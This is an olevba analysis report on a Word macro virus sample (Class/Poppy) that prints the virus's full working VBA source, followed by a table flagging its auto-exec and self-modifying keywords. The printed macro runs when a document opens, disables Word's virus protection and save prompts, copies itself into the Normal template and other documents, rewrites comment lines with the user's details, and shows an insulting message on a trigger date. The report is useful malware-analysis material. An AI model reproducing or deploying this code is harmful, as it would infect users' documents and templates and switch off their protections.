olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Class.fm-35e8a56541d91ef62b7b0769f87b35c08b2ef412
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Class.fm-35e8a56541d91ef62b7b0769f87b35c08b2ef412 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoOpen()
'Kolesz2000.12.04. 18:52:49HP LaserJet 5P on LPT1:Hatos Szilvia
On Error GoTo out
'Kolesz2000.12.04. 18:52:49HP LaserJet 5P on LPT1:Hatos Szilvia
Options.VirusProtection = False
'Kolesz2000.12.04. 18:52:49HP LaserJet 5P on LPT1:Hatos Szilvia
Options.SaveNormalPrompt = False
'Kolesz2000.12.04. 18:52:49HP LaserJet 5P on LPT1:Hatos Szilvia
Options.ConfirmConversions = False
'Kolesz2000.12.04. 18:52:49HP LaserJet 5P on LPT1:Hatos Szilvia
ad = ActiveDocument.VBProject.VBComponents.Item(1).codemodule.CountOfLines
'Kolesz2000.12.04. 18:52:49HP LaserJet 5P on LPT1:Hatos Szilvia
nt = NormalTemplate.VBProject.VBComponents.Item(1).codemodule.CountOfLines
'Kolesz2000.12.04. 18:52:49HP LaserJet 5P on LPT1:Hatos Szilvia
If nt > 70 And ad > 0 Then GoTo out
'Kolesz2000.12.04. 18:52:49HP LaserJet 5P on LPT1:Hatos Szilvia
If nt < 70 Then
'Kolesz2000.12.04. 18:52:49HP LaserJet 5P on LPT1:Hatos Szilvia
    Set host = NormalTemplate.VBProject.VBComponents.Item(1)
'Kolesz2000.12.04. 18:52:49HP LaserJet 5P on LPT1:Hatos Szilvia
    ActiveDocument.VBProject.VBComponents.Item(1).Name = host.Name
'Kolesz2000.12.04. 18:52:49HP LaserJet 5P on LPT1:Hatos Szilvia
    ActiveDocument.VBProject.VBComponents.Item(1).Export "c:\class.sys"
'Kolesz2000.12.04. 18:52:49HP LaserJet 5P on LPT1:Hatos Szilvia
End If
'Kolesz2000.12.04. 18:52:49HP LaserJet 5P on LPT1:Hatos Szilvia
If ad = 0 Then Set host = ActiveDocument.VBProject.VBComponents.Item(1)
'Kolesz2000.12.04. 18:52:49HP LaserJet 5P on LPT1:Hatos Szilvia
If Day(Now) = 14 And (Month(Now) > 5) Then MsgBox "I Think " & Application.UserName & " is a big stupid jerk!", 0, "VicodinES Loves You / Class.Poppy"
'Kolesz2000.12.04. 18:52:49HP LaserJet 5P on LPT1:Hatos Szilvia
host.codemodule.AddFromFile ("c:\class.sys")
'Kolesz2000.12.04. 18:52:49HP LaserJet 5P on LPT1:Hatos Szilvia
With host.codemodule
'Kolesz2000.12.04. 18:52:49HP LaserJet 5P on LPT1:Hatos Szilvia
    For x = 1 To 4
'Kolesz2000.12.04. 18:52:49HP LaserJet 5P on LPT1:Hatos Szilvia
    .deletelines 1
'Kolesz2000.12.04. 18:52:49HP LaserJet 5P on LPT1:Hatos Szilvia
    Next x
'Kolesz2000.12.04. 18:52:49HP LaserJet 5P on LPT1:Hatos Szilvia
End With
'Kolesz2000.12.04. 18:52:49HP LaserJet 5P on LPT1:Hatos Szilvia
If nt < 70 Then
'Kolesz2000.12.04. 18:52:49HP LaserJet 5P on LPT1:Hatos Szilvia
    With host.codemodule
'Kolesz2000.12.04. 18:52:49HP LaserJet 5P on LPT1:Hatos Szilvia
    .replaceline 1, "Sub AutoClose()"
'Kolesz2000.12.04. 18:52:49HP LaserJet 5P on LPT1:Hatos Szilvia
    .replaceline 71, "Sub ToolsMacro()"
'Kolesz2000.12.04. 18:52:49HP LaserJet 5P on LPT1:Hatos Szilvia
    End With
'Kolesz2000.12.04. 18:52:49HP LaserJet 5P on LPT1:Hatos Szilvia
End If
'Kolesz2000.12.04. 18:52:49HP LaserJet 5P on LPT1:Hatos Szilvia
With host.codemodule
'Kolesz2000.12.04. 18:52:49HP LaserJet 5P on LPT1:Hatos Szilvia
    For x = 2 To 72 Step 2
'Kolesz2000.12.04. 18:52:49HP LaserJet 5P on LPT1:Hatos Szilvia
    .replaceline x, "'" & Application.UserName & Now & Application.ActivePrinter & Application.ActiveWindow
'Kolesz2000.12.04. 18:52:49HP LaserJet 5P on LPT1:Hatos Szilvia
    Next x
'Kolesz2000.12.04. 18:52:49HP LaserJet 5P on LPT1:Hatos Szilvia
End With
'Kolesz2000.12.04. 18:52:49HP LaserJet 5P on LPT1:Hatos Szilvia
out:
'Kolesz2000.12.04. 18:52:49HP LaserJet 5P on LPT1:Hatos Szilvia
If nt > 70 And ad = 0 Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
'Kolesz2000.12.04. 18:52:49HP LaserJet 5P on LPT1:Hatos Szilvia
End Sub
'Kolesz2000.12.04. 18:52:49HP LaserJet 5P on LPT1:Hatos Szilvia
Sub ViewVBCode()
'Kolesz2000.12.04. 18:52:49HP LaserJet 5P on LPT1:Hatos Szilvia
End Sub


+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|codemodule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
+----------+--------------------+---------------------------------------------+

